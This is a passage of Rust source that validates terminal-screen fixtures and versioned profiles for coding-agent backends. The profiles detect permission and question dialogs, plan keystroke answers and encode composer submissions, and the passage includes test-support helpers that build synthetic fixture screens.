        .collect::<Vec<_>>();
    let m = object(screen, &fields)?;
    require(
        m["rows"] == entry["rows"] && m["cols"] == entry["cols"],
        "bundled fixture identity differs from its catalog entry",
    )?;
    let rows = positive(&m["rows"])?;
    let cols = positive(&m["cols"])?;
    boolean(&m["alternate_screen"])?;
    m["screen_seq"]
        .as_u64()
        .ok_or_else(|| invalid("fixture screen sequence required"))?;
    require(
        m["cursor_row"]
            .as_u64()
            .is_some_and(|row| row < u64::from(rows))
            && m["cursor_col"]
                .as_u64()
                .is_some_and(|col| col <= u64::from(cols)),
        "fixture cursor outside its geometry",
    )?;
    let lines = array(&m["lines"])?;
    require(
        lines.len() == usize::from(rows) && lines.iter().all(Value::is_string),
        "fixture lines must cover every row",
    )?;
    let mut masked = BTreeSet::new();
    for mask in array(&m["masked_rows"])? {
        let mask = object(mask, &["row", "reason"])?;
        let row = mask["row"]
            .as_u64()
            .and_then(|row| usize::try_from(row).ok())
            .filter(|row| *row < lines.len())
            .ok_or_else(|| invalid("masked row outside fixture geometry"))?;
        require(masked.insert(row), "duplicate masked row")?;
        require(
            mask["reason"] == "reviewed_privacy",
            "masked rows require reviewed privacy",
        )?;
        require(
            lines[row].as_str().is_some_and(str::is_empty),
            "masked row must be empty",
        )?;
    }
    if backgrounds {
        verify_cell_backgrounds(&m["cell_backgrounds"], rows, cols, &masked)?;
    }
    Ok(())
}
const SCREEN_FIELDS: [&str; 8] = [
    "rows",
    "cols",
    "alternate_screen",
    "screen_seq",
    "cursor_row",
    "cursor_col",
    "lines",
    "masked_rows",
];
fn verify_cell_backgrounds(
    value: &Value,
    rows: u16,
    cols: u16,
    masked: &BTreeSet<usize>,
) -> Result<()> {
    let index = |value: &Value, bound: u64| {
        value
            .as_u64()
            .filter(|n| *n <= bound)
            .ok_or_else(|| invalid("background run coordinate outside its geometry"))
    };
    let mut spans = BTreeMap::<u64, Vec<(u64, u64)>>::new();
    for run in array(value)? {
        let run = object(run, &["row", "start_col", "end_col", "bg"])?;
        let row = index(&run["row"], u64::from(rows) - 1)?;
        let start = index(&run["start_col"], u64::from(cols))?;
        let end = index(&run["end_col"], u64::from(cols))?;
        require(start < end, "background run requires start below end")?;
        require(
            !masked.contains(&usize::try_from(row).expect("bounded row")),
            "background run inside a masked row",
        )?;
        let bg = &run["bg"];
        match bg.get("kind").and_then(Value::as_str) {
            Some("indexed") => {
                let m = object(bg, &["kind", "index"])?;
                index(&m["index"], 255)?;
            }
            Some("rgb") => {
                let m = object(bg, &["kind", "r", "g", "b"])?;
                for channel in ["r", "g", "b"] {
                    index(&m[channel], 255)?;
                }
            }
            _ => return Err(invalid("background run requires a non-default colour")),
        }
        spans.entry(row).or_default().push((start, end));
    }
    for runs in spans.values_mut() {
        runs.sort_unstable();
        require(
            runs.windows(2).all(|pair| pair[0].1 <= pair[1].0),
            "background runs overlap",
        )?;
    }
    Ok(())
}

impl ProfileCatalog {
    pub(crate) fn bundled() -> Result<Self> {
        let definitions: Value = serde_json::from_str(BUNDLED_DEFINITIONS)
            .map_err(|cause| invalid(format!("bundled definitions: {cause}")))?;
        Self::from_bundled_definitions(&definitions, BUNDLED_FIXTURES)
    }
    pub(crate) fn from_bundled_definitions(
        definitions: &Value,
        embedded: &[(&str, &[u8])],
    ) -> Result<Self> {
        let catalog = Self::from_definitions(definitions)?;
        verify_bundled_fixtures(array(&definitions["fixtures"])?, embedded)?;
        #[cfg(test)]
        let catalog = Self {
            capture_origin: "bundled_unknown",
            ..catalog
        };
        Ok(catalog)
    }
    #[cfg(test)]
    pub(crate) fn capture_origin(&self) -> &'static str {
        self.capture_origin
    }
    pub(crate) fn from_definitions(value: &Value) -> Result<Self> {
        let root = object(value, &["schema_version", "fixtures", "profiles"])?;
        require(
            root["schema_version"].as_u64() == Some(1),
            "unsupported profile schema",
        )?;
        let mut fixtures = Vec::new();
        let mut ids = BTreeSet::new();
        for v in array(&root["fixtures"])? {
            let m = object(
                v,
                &[
                    "id",
                    "kind",
                    "backend",
                    "native_version",
                    "rows",
                    "cols",
                    "source_ref",
                    "sha256",
                ],
            )?;
            let id = text(&m["id"])?;
            unique(&mut ids, &id)?;
            let native = one_of(&m["kind"], &[("synthetic", false), ("native", true)])?;
            positive(&m["rows"])?;
            positive(&m["cols"])?;
            text(&m["source_ref"])?;
            let hash = text(&m["sha256"])?;
            require(
                hash.len() == 64 && lower_hex(&hash),
                "lowercase source digest required",
            )?;
            fixtures.push(Fixture {
                id,
                native,
                backend: backend(&m["backend"])?,
                version: semver(&m["native_version"])?,
            });
        }
        let mut headers = Vec::new();
        for v in array(&root["profiles"])? {
            let m = object(v, &["backend", "min_version", "rules", "capabilities"])?;
            headers.push((m, backend(&m["backend"])?, semver(&m["min_version"])?));
        }
        for (index, (_, backend, min)) in headers.iter().enumerate() {
            require(
                headers[..index]
                    .iter()
                    .all(|(_, other, earlier)| other != backend || earlier.precedence(min).is_ne()),
                "equal-precedence profile thresholds for one backend",
            )?;
        }
        let mut profiles = Vec::new();
        for (m, backend, min_version) in &headers {
            let (m, backend) = (*m, *backend);
            let interval = Interval {
                min: min_version,
                next: headers
                    .iter()
                    .filter(|(_, other, threshold)| {
                        *other == backend && threshold.precedence(min_version).is_gt()
                    })
                    .map(|(_, _, threshold)| threshold)
                    .min_by(|a, b| a.precedence(b)),
            };
            let rules = array(&m["rules"])?
                .iter()
                .map(compile_rule)
                .collect::<Result<Vec<_>>>()?;
            let mut rule_ids = BTreeSet::new();
            for rule in &rules {
                unique(&mut rule_ids, &rule.id)?;
            }
            for rule in &rules {
                validate_continuation(rule, &rules, backend, &interval, &fixtures)?;
            }
            let c = object(
                &m["capabilities"],
                &["detection", "composer", "annotations", "answers"],
            )?;
            let detection = capability(
                &c["detection"],
                Group::Detection,
                &rules,
                backend,
                &interval,
                &fixtures,
            )?;
            let composer = capability(
                &c["composer"],
                Group::Composer,
                &rules,
                backend,
                &interval,
                &fixtures,
            )?;
            let annotations = capability(
                &c["annotations"],
                Group::Annotations,
                &rules,
                backend,
                &interval,
                &fixtures,
            )?;
            require(
                rules
                    .iter()
                    .filter(|rule| rule.kind.is_annotation())
                    .all(|rule| {
                        annotations
                            .as_ref()
                            .is_some_and(|group| group.rules.contains(&rule.id))
                    }),
                "every annotation rule belongs to the annotations group",
            )?;
            let submissions = composer_submissions(&c["composer"], backend, &interval, &fixtures)?;
            let mut answers = Vec::new();
            let mut keys = BTreeSet::new();
            for v in array(&c["answers"])? {
                let decided = v.get("decision").is_some();
                let a = object(
                    v,
                    if decided {
                        &ANSWER_FIELDS
                    } else {
                        &ANSWER_FIELDS[1..]
                    },
                )?;
                let request = text(&a["request_rule_id"])?;
                let id = text(&a["answer_rule_id"])?;
                unique(&mut rule_ids, &id)?;
                let rule = rules
                    .iter()
                    .find(|r| r.id == request)
                    .ok_or_else(|| invalid("unknown answer request rule"))?;
                let choice_id = text(&a["choice_id"])?;
                let key = if decided {
                    let decision = PermissionDecision::try_from(text(&a["decision"])?.as_str())?;
                    require(
                        rule.kind
                            == ObservationKind::Interaction(InteractionClass::PermissionRequest),
                        "answer requires permission form",
                    )?;
                    AnswerKey::Decision(decision)
                } else {
                    require(
                        rule.kind == ObservationKind::Interaction(InteractionClass::Question),
                        "choice answer requires question form",
                    )?;
                    require(
                        valid_choice_id(&choice_id),
                        "choice id requires lowercase hyphenated words of at most 64 bytes",
                    )?;
                    AnswerKey::Choice(choice_id.clone())
                };
                unique(
                    &mut keys,
                    &match &key {
                        AnswerKey::Decision(decision) => {
                            format!("{request}:decision:{}", decision.as_str())
                        }
                        AnswerKey::Choice(choice) => format!("{request}:choice:{choice}"),
                    },
                )?;
                let choice = rule
                    .choices
                    .iter()
                    .find(|c| c.id == choice_id)
                    .ok_or_else(|| invalid("unknown answer choice"))?;
                require(
                    !decided || choice.scope == ChoiceScope::SingleRequest,
                    "answer requires single-request scope",
                )?;
                let focus = text(&a["focus_matcher_id"])?;
                require(
                    rule.matchers.iter().any(|m| m.id == focus),
                    "unknown answer focus matcher",
                )?;
                let stages = array(&a["stages"])?;
                require(
                    (1..=16).contains(&stages.len()),
                    "one to sixteen measured answer stages required",
                )?;
                let mut compiled_stages = Vec::new();
                for v in stages {
                    let (s, gate) = stage_fields(v)?;
                    let bytes = text(&s["bytes_hex"])?;
                    require(
                        (2..=512).contains(&bytes.len())
                            && bytes.len().is_multiple_of(2)
                            && lower_hex(&bytes),
                        "one to 256 lowercase hexadecimal stage bytes required",
                    )?;
                    let bytes = decoded_hex(&bytes);
                    require(!bytes.contains(&0x1b), "answer stages never contain Escape")?;
                    compiled_stages.push(AnswerStage {
                        bytes,
                        required_rule_id: request.clone(),
                        required_choice_id: choice_id.clone(),
                        gate,
                    });
                    require(
                        text(&s["required_rule_id"])? == request
                            && text(&s["required_choice_id"])? == choice_id,
                        "answer stage request/decision mismatch",
                    )?;
                }
                validate_gates(&compiled_stages, rule, &rules, &choice_id, &focus)?;
                let fixture_ids = texts(&a["fixture_ids"])?;
                provenance(&fixture_ids, backend, &interval, &fixtures)?;
                answers.push(Answer {
                    key,
                    request,
                    id,
                    fixtures: fixture_ids,
                    choice_id,
                    focus_matcher_id: focus,
                    stages: compiled_stages,
                });
            }
            profiles.push(Profile {
                backend,
                min_version: min_version.clone(),
                min_version_text: text(&m["min_version"])?,
                rules,
                detection,
                composer,
                annotations,
                submissions,
                answers,
            });
        }
        Ok(Self {
            profiles,
            #[cfg(test)]
            capture_origin: "synthetic",
        })
    }
    pub(super) fn matching(&self, backend: CodingAgent, version: Option<&str>) -> Option<&Profile> {
        let version = NativeVersion::parse(version?)?;
        self.profiles
            .iter()
            .filter(|p| p.backend == backend && p.min_version.precedence(&version).is_le())
            .max_by(|a, b| a.min_version.precedence(&b.min_version))
    }
    pub(crate) fn unsupported_minimum(&self, backend: CodingAgent, version: &str) -> Option<&str> {
        let version = NativeVersion::parse(version)?;
        let lowest = self
            .profiles
            .iter()
            .filter(|p| p.backend == backend)
            .min_by(|a, b| a.min_version.precedence(&b.min_version))?;
        version
            .precedence(&lowest.min_version)
            .is_lt()
            .then_some(lowest.min_version_text.as_str())
    }
    pub(crate) fn rule_ids(&self) -> Vec<String> {
        self.profiles
            .iter()
            .flat_map(|p| p.rules.iter().map(|r| r.id.clone()))
            .collect::<BTreeSet<_>>()
            .into_iter()
            .collect()
    }
    pub(crate) fn capabilities(
        &self,
        backend: CodingAgent,
        version: Option<&str>,
    ) -> NativeCapabilities {
        let profile = self.matching(backend, version);
        NativeCapabilities {
            #[cfg(test)]
            backend,
            #[cfg(test)]
            native_version: version.map(str::to_owned),
            #[cfg(test)]
            min_version: profile.map(|p| p.min_version_text.clone()),
            detection: if profile.is_some_and(|p| p.detection.is_some()) {
                Coverage::Tested
            } else {
                Coverage::Unknown
            },
            #[cfg(test)]
            composer: if profile.is_some_and(|p| p.composer.is_some()) {
                Coverage::Tested
            } else {
                Coverage::Unknown
            },
            #[cfg(test)]
            prompt_submission: if profile
                .is_some_and(|p| p.submissions[ComposerOperation::Prompt.index()].is_some())
            {
                Coverage::Tested
            } else {
                Coverage::Unknown
            },
            #[cfg(test)]
            native_exec_submission: if profile
                .is_some_and(|p| p.submissions[ComposerOperation::Exec.index()].is_some())
            {
                Coverage::Tested
            } else {
                Coverage::Unknown
            },
            #[cfg(test)]
            answer_decisions: profile
                .map(|p| {
                    let mut decisions = Vec::new();
                    for decision in p.answers.iter().filter_map(|answer| answer.key.decision()) {
                        if !decisions.contains(&decision) {
                            decisions.push(decision);
                        }
                    }
                    decisions
                })
                .unwrap_or_default(),
            #[cfg(test)]
            capability_reason: if profile.is_none() {
                Some("native profile unavailable".into())
            } else {
                None
            },
        }
    }
    pub(crate) fn answer_plans(
        &self,
        backend: CodingAgent,
        version: &str,
        request: &str,
    ) -> Vec<AnswerPlan> {
        self.matching(backend, Some(version))
            .map(|profile| profile.answer_plans(version, request))
            .unwrap_or_default()
    }
}

#[cfg(test)]
impl ProfileCatalog {
    pub(crate) fn answer_plan(
        &self,
        backend: CodingAgent,
        version: &str,
        request: &str,
        key: &AnswerKey,
    ) -> Option<AnswerPlan> {
        self.matching(backend, Some(version))?
            .answer_plan(version, request, key)
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum ComposerOperation {
    Prompt,
    Exec,
}

impl ComposerOperation {
    pub(super) fn index(self) -> usize {
        match self {
            Self::Prompt => 0,
            Self::Exec => 1,
        }
    }

    pub(super) fn prefix_hex(self) -> &'static str {
        match self {
            Self::Prompt => "",
            Self::Exec => "2120",
        }
    }
}

#[derive(Clone)]
pub(super) struct ComposerSubmission {
    pub(crate) prefix: Vec<u8>,
    pub(crate) submit: Vec<u8>,
    pub(crate) fixture_ids: Vec<String>,
}

pub(crate) struct ComposerPlan {
    backend: CodingAgent,
    native_version: String,
    rule_ids: Vec<String>,
    fixture_ids: Vec<String>,
    operation: ComposerOperation,
    prefix: Vec<u8>,
    submit: Vec<u8>,
}

impl ComposerPlan {
    pub(crate) fn backend(&self) -> CodingAgent {
        self.backend
    }

    pub(crate) fn native_version(&self) -> &str {
        &self.native_version
    }

    pub(crate) fn rule_ids(&self) -> &[String] {
        &self.rule_ids
    }

    pub(crate) fn fixture_ids(&self) -> &[String] {
        &self.fixture_ids
    }

    pub(crate) fn encode(&self, literal: &str) -> std::result::Result<Vec<u8>, CafleetError> {
        assert!(
            self.prefix.len() == self.operation.prefix_hex().len() / 2,
            "validated composer prefix matches its operation"
        );
        let size = self
            .prefix
            .len()
            .checked_add(literal.len())
            .and_then(|size| size.checked_add(self.submit.len()))
            .filter(|size| *size <= 65536)
            .ok_or_else(|| {
                CafleetError::App("native composer payload exceeds 65536 bytes".into())
            })?;
        let mut bytes = Vec::with_capacity(size);
        bytes.extend_from_slice(&self.prefix);
        bytes.extend_from_slice(literal.as_bytes());
        bytes.extend_from_slice(&self.submit);
        Ok(bytes)
    }

    pub(crate) fn stages(&self, literal: &str) -> std::result::Result<[Vec<u8>; 2], CafleetError> {
        let mut encoded = self.encode(literal)?;
        let submit = encoded.split_off(encoded.len() - self.submit.len());
        Ok([encoded, submit])
    }
}

impl ProfileCatalog {
    pub(crate) fn composer_plan(
        &self,
        backend: CodingAgent,
        native_version: &str,
        operation: ComposerOperation,
    ) -> Option<ComposerPlan> {
        let profile = self.matching(backend, Some(native_version))?;
        let submission = profile.submissions[operation.index()].as_ref()?;
        let observation = profile
            .composer
            .as_ref()
            .expect("executable composer requires validated observation provenance");
        Some(ComposerPlan {
            backend,
            native_version: native_version.into(),
            rule_ids: observation.rules.clone(),
            fixture_ids: submission.fixture_ids.clone(),
            operation,
            prefix: submission.prefix.clone(),
            submit: submission.submit.clone(),
        })
    }
}

#[cfg(test)]
pub(crate) mod test_support {
    use crate::coding_agent::catalog::*;
    use serde_json::json;

    pub(crate) struct BundledBoundary {
        pub(crate) backend: CodingAgent,
        pub(crate) min_version: &'static str,
        pub(crate) later: [&'static str; 2],
        pub(crate) below: &'static str,
    }

    /// Each backend's first bundled boundary, later supported native versions
    /// and a version below that boundary.
    pub(crate) const BUNDLED_BOUNDARIES: [BundledBoundary; 3] = [
        BundledBoundary {
            backend: CodingAgent::Claude,
            min_version: "2.1.302",
            later: ["2.1.308", "3.0.0-beta.1"],
            below: "2.1.301",
        },
        BundledBoundary {
            backend: CodingAgent::Codex,
            min_version: "0.163.0",
            later: ["0.164.0", "1.0.0+build.7"],
            below: "0.163.0-alpha.2",
        },
        BundledBoundary {
            backend: CodingAgent::Opencode,
            min_version: "2.1.4",
            later: ["2.1.40", "2.10.0"],
            below: "2.1.3",
        },
    ];

    pub(crate) fn fixture_at(id: &str, version: &str) -> Value {
        let mut fixture = synthetic_definitions()["fixtures"][0].clone();
        fixture["id"] = json!(id);
        fixture["native_version"] = json!(version);
        fixture
    }

    /// A Codex catalog whose profiles are `(label, min_version)` thresholds,
    /// each citing one fixture captured at its boundary for detection,
    /// composer observation, both composer operations, annotations and an
    /// allow answer; the label names that fixture and answer rule.
    pub(crate) fn thresholds(profiles: &[(&str, &str)]) -> Value {
        thresholds_for(CodingAgent::Codex, profiles)
    }

    pub(crate) fn thresholds_for(backend: CodingAgent, profiles: &[(&str, &str)]) -> Value {
        let base = crate::coding_agent::catalog::test_support::annotation::annotated();
        let composer = simple_definition("composer_empty", true)["profiles"][0]["rules"][0].clone();
        let mut value = base.clone();
        value["fixtures"] = json!([]);
        value["profiles"] = json!([]);
        for (name, min) in profiles {
            let id = format!("{FIXTURE}-{}-{name}", backend.name());
            let mut fixture = fixture_at(&id, min);
            fixture["backend"] = json!(backend.name());
            value["fixtures"].as_array_mut().unwrap().push(fixture);
            let mut profile = base["profiles"][0].clone();
            profile["backend"] = json!(backend.name());
            profile["min_version"] = json!(min);
            profile["rules"]
                .as_array_mut()
                .unwrap()
                .push(composer.clone());
            let capabilities = &mut profile["capabilities"];
            capabilities["detection"]["fixture_ids"] = json!([id]);
            capabilities["annotations"]["fixture_ids"] = json!([id]);
            capabilities["composer"] = json!({
                "rule_ids":["synthetic-composer_empty"],"fixture_ids":[id],
                "submission":{
                    "prompt":{"prefix_hex":"","submit_hex":"0d","fixture_ids":[id]},
                    "exec":{"prefix_hex":"2120","submit_hex":"0d","fixture_ids":[id]}
                }
            });
            capabilities["answers"] = json!([{
                "decision":"allow","request_rule_id":RULE,"answer_rule_id":format!("{name}-allow-plan"),
                "choice_id":"allow-once","focus_matcher_id":"allow","fixture_ids":[id],
                "stages":[{"bytes_hex":"78","required_rule_id":RULE,"required_choice_id":"allow-once"}]
            }]);
            value["profiles"].as_array_mut().unwrap().push(profile);
        }
        value
    }

    fn bundled_file(id: &str) -> (String, Value) {
        let definitions = bundled_definitions();
        let entry = definitions["fixtures"]
            .as_array()
            .unwrap()
            .iter()
            .find(|entry| entry["id"] == id)
            .unwrap_or_else(|| panic!("the bundled catalog contains {id}"));
        let source = entry["source_ref"].as_str().unwrap().to_owned();
        let (_, bytes) = BUNDLED_FIXTURES
            .iter()
            .find(|(cited, _)| *cited == source)
            .expect("the catalogued backend file is embedded");
        (source, serde_json::from_slice(bytes).unwrap())
    }

    pub(crate) fn bundled_fixture(id: &str) -> String {
        let (_, file) = bundled_file(id);
        let screen = file["screens"]
            .as_object()
            .expect("the backend file contains a screen map")
            .get(id)
            .expect("the catalogued screen is embedded");
        crate::digest::canonical_json(screen)
    }

    pub(crate) fn bundled_embedded() -> Vec<(&'static str, &'static [u8])> {
        BUNDLED_FIXTURES.to_vec()
    }

    pub(crate) fn bundled_definitions() -> Value {
        serde_json::from_str(BUNDLED_DEFINITIONS).unwrap()
    }

    /// The fixtures a bundled profile cites as composer prompt/exec submission provenance.
    pub(crate) fn submission_fixture_ids(backend: CodingAgent) -> BTreeSet<String> {
        let definitions = bundled_definitions();
        let profile = definitions["profiles"]
            .as_array()
            .unwrap()
            .iter()
            .find(|profile| profile["backend"] == backend.name())
            .expect("bundled backend profile");
        ["prompt", "exec"]
            .iter()
            .flat_map(|operation| {
                profile["capabilities"]["composer"]["submission"][operation]["fixture_ids"]
                    .as_array()
                    .unwrap()
                    .iter()
                    .map(|id| id.as_str().unwrap().to_owned())
                    .collect::<Vec<_>>()
            })
            .collect()
    }

    pub(crate) fn bundled_entry<'a>(definitions: &'a mut Value, id: &str) -> &'a mut Value {
        definitions["fixtures"]
            .as_array_mut()
            .unwrap()
            .iter_mut()
            .find(|entry| entry["id"] == id)
            .unwrap_or_else(|| panic!("the bundled catalog cites {id}"))
    }

    /// The bundled catalog with `id`'s screen and catalog entry changed; the
    /// entry's digest follows the changed screen.
    pub(crate) fn guarded_fixture(
        id: &str,
        change_definitions: impl FnOnce(&mut Value),
        change_screen: impl FnOnce(&mut Value),
    ) -> Result<ProfileCatalog> {
        let (source, mut file) = bundled_file(id);
        let screen = file["screens"]
            .as_object_mut()
            .expect("the backend file contains a screen map")
            .get_mut(id)
            .expect("the catalogued screen is embedded");
        change_screen(screen);
        let digest = crate::digest::sha256_hex(crate::digest::canonical_json(screen).as_bytes());
        let mut definitions = bundled_definitions();
        bundled_entry(&mut definitions, id)["sha256"] = json!(digest);
        change_definitions(&mut definitions);
        load_bundled_file(&source, &file, &definitions)
    }

    pub(crate) fn guarded_fixture_file(
        id: &str,
        change_definitions: impl FnOnce(&mut Value),
        change_file: impl FnOnce(&mut Value),
    ) -> Result<ProfileCatalog> {
        let (source, mut file) = bundled_file(id);
        let mut definitions = bundled_definitions();
        change_file(&mut file);
        change_definitions(&mut definitions);
        load_bundled_file(&source, &file, &definitions)
    }

    fn load_bundled_file(
        source: &str,
        file: &Value,
        definitions: &Value,
    ) -> Result<ProfileCatalog> {
        let bytes = serde_json::to_vec_pretty(file).unwrap();
        let mut embedded = bundled_embedded();
        embedded.retain(|&(cited, _)| cited != source);
        embedded.push((source, &bytes));
        ProfileCatalog::from_bundled_definitions(definitions, &embedded)
    }

    pub(crate) fn synthetic_definitions() -> Value {
        json!({
            "schema_version":1,
            "fixtures":[{"id":"synthetic-permission-1","kind":"synthetic","backend":"codex","native_version":"0.0.1-synthetic","rows":24,"cols":80,"source_ref":"synthetic-permission-screen.json","sha256":"689868668a9fa97d9efca75cda3f2cc0a87fde25884a5cb36aab3163b8abd773"}],
            "profiles":[{"backend":"codex","min_version":"0.0.1-synthetic",
                "rules":[{"id":"synthetic-permission","priority":100,"observation":"permission_request",
                    "region":{"screen":"either","start_pattern":"^Synthetic permission request$","end_pattern":"^Selection: $","max_rows":8,"cursor":"at_end"},
                    "matchers":[
                        {"id":"operation","scope":"line","pattern":"^Operation: (?P<operation>.+)$"},
                        {"id":"allow","scope":"line","pattern":"^> (?P<label>Allow once)$"},
                        {"id":"deny","scope":"line","pattern":"^  (?P<label>Deny once)$"},
                        {"id":"form","scope":"line","pattern":"^Request form: synthetic-only$"}
                    ],
                    "extract":{"operation":{"matcher_id":"operation","capture":"operation"},"choices":[
                        {"id":"allow-once","label":{"matcher_id":"allow","capture":"label"},"scope":"single_request"},
                        {"id":"deny-once","label":{"matcher_id":"deny","capture":"label"},"scope":"single_request"}
                    ],"native_request_id":null},"verified_noninteraction":false,"sensitive":false}],
                "capabilities":{"detection":{"rule_ids":["synthetic-permission"],"fixture_ids":["synthetic-permission-1"]},"composer":null,"annotations":null,"answers":[]}}]
        })
    }

    pub(crate) fn synthetic_catalog() -> ProfileCatalog {
        ProfileCatalog::from_definitions(&synthetic_definitions()).unwrap()
    }
    pub(crate) fn inspection_fixture_definition() -> Value {
        let mut value = synthetic_definitions();
        value["profiles"][0]["rules"][0]["matchers"][3]["pattern"] =
            json!("^Request form: (?P<focus>synthetic-only|synthetic-other)$");
        let mut alternate = value["profiles"][0]["rules"][0].clone();
        alternate["id"] = json!("inspection-alternate-request");
        alternate["matchers"][3]["pattern"] = json!("^Request form: (?P<focus>synthetic-alt)$");
        value["profiles"][0]["rules"]
            .as_array_mut()
            .unwrap()
            .push(alternate);
        value["profiles"][0]["capabilities"]["detection"]["rule_ids"] =
            json!(["synthetic-permission", "inspection-alternate-request"]);
        value["profiles"][0]["capabilities"]["answers"] = json!([
            answer(
                "allow",
                "synthetic-permission",
                "inspection-allow-plan",
                "allow-once",
                "79"
            ),
            answer(
                "deny",
                "synthetic-permission",
                "inspection-deny-plan",
                "deny-once",
                "6e"
            ),
            answer(
                "allow",
                "inspection-alternate-request",
                "inspection-alternate-allow",
                "allow-once",
                "61"
            )
        ]);
        value
    }

    pub(crate) fn answer(
        decision: &str,
        request: &str,
        id: &str,
        choice: &str,
        byte: &str,
    ) -> Value {
        json!({
            "decision":decision,"request_rule_id":request,"answer_rule_id":id,
            "choice_id":choice,"focus_matcher_id":"form","fixture_ids":["synthetic-permission-1"],
            "stages":[
                {"bytes_hex":byte,"required_rule_id":request,"required_choice_id":choice},
                {"bytes_hex":"0d","required_rule_id":request,"required_choice_id":choice}
            ]
        })
    }

    pub(crate) fn inspection_fixture_form(operation: &str, focus: &str) -> Vec<u8> {
        format!("\x1b[2J\x1b[19;1HSynthetic permission request\r\nOperation: {operation}\r\n> Allow once\r\n  Deny once\r\nRequest form: {focus}\r\nSelection: ").into_bytes()
    }

    pub(crate) const GATED_RULE: &str = "synthetic-gated";
    pub(crate) const GATED_REASON_RULE: &str = "synthetic-reason";
    pub(crate) const GATED_REASON_FIXTURE: &str = "synthetic-reason-native-1";
    pub(crate) const FOCUS_SGR: &str = "\x1b[48;2;250;178;131m";

    pub(crate) fn gated_fixture_definition() -> Value {
        let mut value = synthetic_definitions();
        let mut native = value["fixtures"][0].clone();
        native["id"] = json!(GATED_REASON_FIXTURE);
        native["kind"] = json!("native");
        value["fixtures"].as_array_mut().unwrap().push(native);
        value["profiles"][0]["rules"] = json!([
            {
                "id":GATED_RULE,"priority":100,"observation":"permission_request",
                "region":{"screen":"either","start_pattern":"^Synthetic gated request$","end_pattern":"^Selection: $","max_rows":8,"cursor":"any"},
                "matchers":[
                    {"id":"heading","scope":"line","pattern":"^Synthetic gated request$"},
                    {"id":"operation","scope":"line","pattern":"^Operation: (?P<operation>.+)$"},
                    {"id":"focus","scope":"line","pattern":"^  Allow once   (?:Always allow   )?Deny once$","focus_style":"background"},
                    {"id":"allow","scope":"line","pattern":"^  (?P<label>Allow once)   "},
                    {"id":"deny","scope":"line","pattern":"   (?P<label>Deny once)$"}
                ],
                "extract":{"operation":{"matcher_id":"operation","capture":"operation"},"choices":[
                    {"id":"allow-once","label":{"matcher_id":"allow","capture":"label"},"scope":"single_request"},
                    {"id":"deny-once","label":{"matcher_id":"deny","capture":"label"},"scope":"single_request"}
                ],"native_request_id":null},
                "verified_noninteraction":false,"sensitive":false
            },
            {
                "id":GATED_REASON_RULE,"priority":100,"observation":"permission_continuation",
                "region":{"screen":"either","start_pattern":"^Synthetic reject reason$","end_pattern":"^Confirm: enter$","max_rows":4,"cursor":"any"},
                "matchers":[
                    {"id":"heading","scope":"line","pattern":"^Synthetic reject reason$"},
                    {"id":"empty","scope":"line","pattern":"^Reason: \\(empty\\)$"}
                ],
                "extract":{"operation":null,"choices":[],"native_request_id":null},
                "verified_noninteraction":false,"sensitive":false,
                "continues_rule_id":GATED_RULE,"continues_choice_id":"deny-once",
                "fixture_ids":[GATED_REASON_FIXTURE]
            }
        ]);
        value["profiles"][0]["capabilities"]["detection"]["rule_ids"] = json!([GATED_RULE]);
        value["profiles"][0]["capabilities"]["answers"] = json!([
            {
                "decision":"allow","request_rule_id":GATED_RULE,"answer_rule_id":"synthetic-gated-allow",
                "choice_id":"allow-once","focus_matcher_id":"focus","fixture_ids":["synthetic-permission-1"],
                "stages":[
                    {"bytes_hex":"0d","required_rule_id":GATED_RULE,"required_choice_id":"allow-once","required_focus_choice_id":"allow-once"}
                ]
            },
            {
                "decision":"deny","request_rule_id":GATED_RULE,"answer_rule_id":"synthetic-gated-deny",
                "choice_id":"deny-once","focus_matcher_id":"focus","fixture_ids":["synthetic-permission-1"],
                "stages":[
                    {"bytes_hex":"68","required_rule_id":GATED_RULE,"required_choice_id":"deny-once","required_focus_choice_id":"allow-once"},
                    {"bytes_hex":"0d","required_rule_id":GATED_RULE,"required_choice_id":"deny-once","required_focus_choice_id":"deny-once"},
                    {"bytes_hex":"0d","required_rule_id":GATED_RULE,"required_choice_id":"deny-once","required_screen_rule_id":GATED_REASON_RULE}
                ]
            }
        ]);
        value
    }

    /// `focused` names the labels painted with `focus_sgr`; the rest of the choice row keeps
    /// `row_sgr`, which is the row background the detector compares against.
    pub(crate) fn gated_fixture_form_styled(
        operation: &str,
        always: bool,
        focused: &[&str],
        row_sgr: &str,
        focus_sgr: &str,
    ) -> Vec<u8> {
        let labels: &[&str] = if always {
            &["Allow once", "Always allow", "Deny once"]
        } else {
            &["Allow once", "Deny once"]
        };
        // The erase paints the whole row in its background, as the native form does.
        let mut row = format!("{row_sgr}\x1b[K  ");
        for (index, label) in labels.iter().enumerate() {
            if index > 0 {
                row.push_str("   ");
            }
            if focused.contains(label) {
                row.push_str(&format!("{focus_sgr}{label}\x1b[0m{row_sgr}"));
            } else {
                row.push_str(label);
            }
        }
        row.push_str("\x1b[0m");
        format!("\x1b[0m\x1b[2J\x1b[19;1HSynthetic gated request\r\nOperation: {operation}\r\n{row}\r\nSelection: ").into_bytes()
    }

    pub(crate) fn gated_fixture_form(operation: &str, focused: &str) -> Vec<u8> {
        let focused: &[&str] = match focused {
            "allow" => &["Allow once"],
            "deny" => &["Deny once"],
            "always" => &["Always allow"],
            "none" => &[],
            _ => panic!("known synthetic focus"),
        };
        gated_fixture_form_styled(operation, true, focused, "", FOCUS_SGR)
    }

    pub(crate) fn gated_reason_dialog(reason: Option<&str>) -> Vec<u8> {
        let reason = reason.unwrap_or("(empty)");
        format!(
            "\x1b[0m\x1b[2J\x1b[19;1HSynthetic reject reason\r\nReason: {reason}\r\nConfirm: enter"
        )
        .into_bytes()
    }
    pub(crate) const QUESTION_RULE: &str = "synthetic-question";
    pub(crate) const QUESTION_NOTICE_RULE: &str = "synthetic-question-notice";
    pub(crate) const QUESTION_DECLINE_PLAN: &str = "synthetic-question-decline";
    pub(crate) const QUESTION_LATER_PLAN: &str = "synthetic-question-later";

    pub(crate) fn question_stage(bytes: &str, choice: &str, focus: Option<&str>) -> Value {
        let mut stage =
            json!({"bytes_hex":bytes,"required_rule_id":QUESTION_RULE,"required_choice_id":choice});
        if let Some(focus) = focus {
            stage["required_focus_choice_id"] = json!(focus);
        }
        stage
    }

    pub(crate) fn choice_answer(request: &str, id: &str, choice: &str, stages: Value) -> Value {
        json!({
            "request_rule_id":request,"answer_rule_id":id,"choice_id":choice,
            "focus_matcher_id":"focus","fixture_ids":[FIXTURE],"stages":stages
        })
    }

    /// The permission profile plus a marker-focused question with a gated `decline` plan, an
